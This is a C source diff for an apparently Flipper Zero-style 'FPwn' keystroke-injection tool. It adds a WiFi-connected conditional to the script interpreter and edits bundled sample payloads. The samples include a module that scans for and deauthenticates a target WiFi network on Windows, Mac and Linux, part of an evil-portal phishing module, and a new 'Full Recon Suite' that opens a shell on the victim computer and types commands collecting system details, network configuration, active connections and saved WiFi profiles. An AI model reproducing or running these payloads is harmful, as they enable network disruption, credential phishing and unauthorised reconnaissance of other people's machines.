@@ -531,6 +531,17 @@ static void fpwn_exec_command(const char* line, FPwnApp* app) {
         return;
     }
 
+    /* ---- IF_CONNECTED — skip to END_IF if ESP32 not connected ---- */
+    if(strcmp(line, "IF_CONNECTED") == 0) {
+        /* This is handled at the execution loop level, not here.
+         * If we reach here, it means the conditional is satisfied. */
+        return;
+    }
+    if(strcmp(line, "END_IF") == 0) {
+        /* Matched end — noop, handled at the loop level. */
+        return;
+    }
+
     /* ---- VAR $name = value  /  SET $name = value ---- */
     if(strncmp(line, "VAR ", 4) == 0 || strncmp(line, "SET ", 4) == 0) {
         const char* rest = line + 4;
@@ -1594,6 +1605,36 @@ int32_t fpwn_payload_execute_thread(void* ctx) {
         /* Substitute template variables then execute */
         fpwn_substitute(trimmed, substituted, sizeof(substituted), module);
 
+        /* Handle IF_CONNECTED / END_IF conditional blocks.
+         * If the ESP32 is not connected, skip everything until END_IF. */
+        if(strcmp(substituted, "IF_CONNECTED") == 0) {
+            bool esp_ok = app->wifi_uart && fpwn_wifi_uart_is_connected(app->wifi_uart) &&
+                          app->marauder;
+            if(!esp_ok) {
+                /* Skip to matching END_IF */
+                int depth = 1;
+                while(depth > 0 && !storage_file_eof(file) && !app->abort_requested) {
+                    size_t sn = fpwn_read_line(file, raw, sizeof(raw));
+                    if(sn == 0 && storage_file_eof(file)) break;
+                    char* st = fpwn_trim(raw);
+                    if(strcmp(st, "IF_CONNECTED") == 0)
+                        depth++;
+                    else if(strcmp(st, "END_IF") == 0)
+                        depth--;
+                    if(st[0] != '\0' && st[0] != '#') lines_done++;
+                }
+                with_view_model(
+                    app->execute_view, FPwnExecModel * em, { em->lines_done = lines_done; }, true);
+                continue;
+            }
+            lines_done++;
+            continue;
+        }
+        if(strcmp(substituted, "END_IF") == 0) {
+            lines_done++;
+            continue;
+        }
+
         /* Update status to show the command being executed */
         with_view_model(
             app->execute_view,
@@ -2161,6 +2202,7 @@ static const char SAMPLE_WIFI_ATTACK[] =
     "OPTION DELAY 500 \"Initial delay (ms)\"\n"
     "PLATFORM WIN\n"
     "DELAY {{DELAY}}\n"
+    "IF_CONNECTED\n"
     "REM Scan nearby WiFi APs via ESP32\n"
     "WIFI_SCAN\n"
     "REM Open Notepad and type results\n"
@@ -2172,12 +2214,14 @@ static const char SAMPLE_WIFI_ATTACK[] =
     "STRINGLN === WiFi Scan Results ===\n"
     "WIFI_RESULT\n"
     "STRINGLN === End Results ===\n"
-    "REM Now deauth the target\n"
+    "REM Targeted deauth\n"
     "WIFI_DEAUTH_TARGET {{TARGET_SSID}}\n"
     "WIFI_WAIT 10000\n"
     "WIFI_STOP\n"
+    "END_IF\n"
     "PLATFORM MAC\n"
     "DELAY {{DELAY}}\n"
+    "IF_CONNECTED\n"
     "WIFI_SCAN\n"
     "GUI SPACE\n"
     "DELAY 700\n"
@@ -2190,8 +2234,10 @@ static const char SAMPLE_WIFI_ATTACK[] =
     "WIFI_DEAUTH_TARGET {{TARGET_SSID}}\n"
     "WIFI_WAIT 10000\n"
     "WIFI_STOP\n"
+    "END_IF\n"
     "PLATFORM LINUX\n"
     "DELAY {{DELAY}}\n"
+    "IF_CONNECTED\n"
     "WIFI_SCAN\n"
     "CTRL ALT t\n"
     "DELAY 1400\n"
@@ -2200,7 +2246,8 @@ static const char SAMPLE_WIFI_ATTACK[] =
     "STRINGLN SCAN\n"
     "WIFI_DEAUTH_TARGET {{TARGET_SSID}}\n"
     "WIFI_WAIT 10000\n"
-    "WIFI_STOP\n";
+    "WIFI_STOP\n"
+    "END_IF\n";
 
 /* Evil portal phishing module — spawn portal, wait for creds */
 static const char SAMPLE_PORTAL_PHISH[] =
@@ -2243,6 +2290,98 @@ static const char SAMPLE_PORTAL_PHISH[] =
     "DELAY 1400\n"
     "STRINGLN echo '=== Captured Portal Data ==='\n"
     "WIFI_RESULT\n";
+
+/* Full recon suite — combined local + WiFi recon with variables */
+static const char SAMPLE_FULL_RECON[] =
+    "NAME Full Recon Suite\n"
+    "DESCRIPTION Comprehensive recon: local system + WiFi + network\n"
+    "CATEGORY recon\n"
+    "PLATFORMS WIN,MAC,LINUX\n"
+    "OPTION DELAY 500 \"Initial delay (ms)\"\n"
+    "PLATFORM WIN\n"
+    "DELAY {{DELAY}}\n"
+    "VAR $SEP = ========================================\n"
+    "REM Open PowerShell\n"
+    "GUI r\n"
+    "DELAY 500\n"
+    "STRING powershell\n"
+    "ENTER\n"
+    "DELAY 1500\n"
+    "STRINGLN echo $SEP\n"
+    "STRINGLN echo '== SYSTEM INFO =='\n"
+    "STRINGLN echo $SEP\n"
+    "STRINGLN hostname; whoami; systeminfo | Select-String 'OS'\n"
+    "STRINGLN echo $SEP\n"
+    "STRINGLN echo '== NETWORK CONFIG =='\n"
+    "STRINGLN echo $SEP\n"
+    "STRINGLN ipconfig | Select-String 'IPv4|Gateway|DNS'\n"
+    "STRINGLN echo $SEP\n"
+    "STRINGLN echo '== ACTIVE CONNECTIONS =='\n"
+    "STRINGLN echo $SEP\n"
+    "STRINGLN netstat -an | Select-String 'ESTABLISHED|LISTENING' | Select-Object -First 20\n"
+    "STRINGLN echo $SEP\n"
+    "STRINGLN echo '== WIFI PROFILES =='\n"
+    "STRINGLN echo $SEP\n"
+    "STRINGLN netsh wlan show profiles | Select-String 'All User'\n"
+    "IF_CONNECTED\n"
+    "REM ESP32 WiFi recon\n"
+    "WIFI_SCAN\n"
+    "STRINGLN echo $SEP\n"
+    "STRINGLN echo '== NEARBY APs (ESP32) =='\n"
+    "STRINGLN echo $SEP\n"
+    "WIFI_RESULT\n"
+    "END_IF\n"
+    "PLATFORM MAC\n"
+    "DELAY {{DELAY}}\n"
+    "VAR $SEP = ========================================\n"
+    "GUI SPACE\n"
+    "DELAY 700\n"
+    "STRING Terminal\n"
+    "ENTER\n"
+    "DELAY 1400\n"
+    "STRINGLN echo $SEP\n"
+    "STRINGLN echo '== SYSTEM INFO =='\n"
+    "STRINGLN echo $SEP\n"
+    "STRINGLN hostname; whoami; sw_vers\n"
+    "STRINGLN echo $SEP\n"
+    "STRINGLN echo '== NETWORK CONFIG =='\n"
+    "STRINGLN echo $SEP\n"
+    "STRINGLN ifconfig | grep 'inet '\n"
+    "STRINGLN echo $SEP\n"
+    "STRINGLN echo '== ACTIVE CONNECTIONS =='\n"
+    "STRINGLN echo $SEP\n"
+    "STRINGLN netstat -an | grep ESTABLISHED | head -20\n"
+    "IF_CONNECTED\n"
+    "WIFI_SCAN\n"
+    "STRINGLN echo $SEP\n"
+    "STRINGLN echo '== NEARBY APs (ESP32) =='\n"
+    "STRINGLN echo $SEP\n"
+    "WIFI_RESULT\n"
+    "END_IF\n"
+    "PLATFORM LINUX\n"
+    "DELAY {{DELAY}}\n"
+    "VAR $SEP = ========================================\n"
+    "CTRL ALT t\n"
+    "DELAY 1400\n"
+    "STRINGLN echo $SEP\n"
+    "STRINGLN echo '== SYSTEM INFO =='\n"
+    "STRINGLN echo $SEP\n"
+    "STRINGLN hostname; whoami; uname -a\n"
+    "STRINGLN echo $SEP\n"
+    "STRINGLN echo '== NETWORK CONFIG =='\n"
+    "STRINGLN echo $SEP\n"
+    "STRINGLN ip addr | grep 'inet '\n"
+    "STRINGLN echo $SEP\n"
+    "STRINGLN echo '== ACTIVE CONNECTIONS =='\n"
+    "STRINGLN echo $SEP\n"
+    "STRINGLN ss -tunp | head -20\n"
+    "IF_CONNECTED\n"
+    "WIFI_SCAN\n"
+    "STRINGLN echo $SEP\n"
+    "STRINGLN echo '== NEARBY APs (ESP32) =='\n"
+    "STRINGLN echo $SEP\n"
+    "WIFI_RESULT\n"
+    "END_IF\n";
 
 static bool fpwn_write_sample_file(Storage* storage, const char* path, const char* content) {
     File* f = storage_file_alloc(storage);
@@ -2308,4 +2447,7 @@ void fpwn_modules_write_samples(FPwnApp* app) {
 
     snprintf(path, sizeof(path), "%s/portal_phish.fpwn", FPWN_MODULES_DIR);
     fpwn_write_sample_file(app->storage, path, SAMPLE_PORTAL_PHISH);
+
+    snprintf(path, sizeof(path), "%s/full_recon.fpwn", FPWN_MODULES_DIR);
+    fpwn_write_sample_file(app->storage, path, SAMPLE_FULL_RECON);
 }
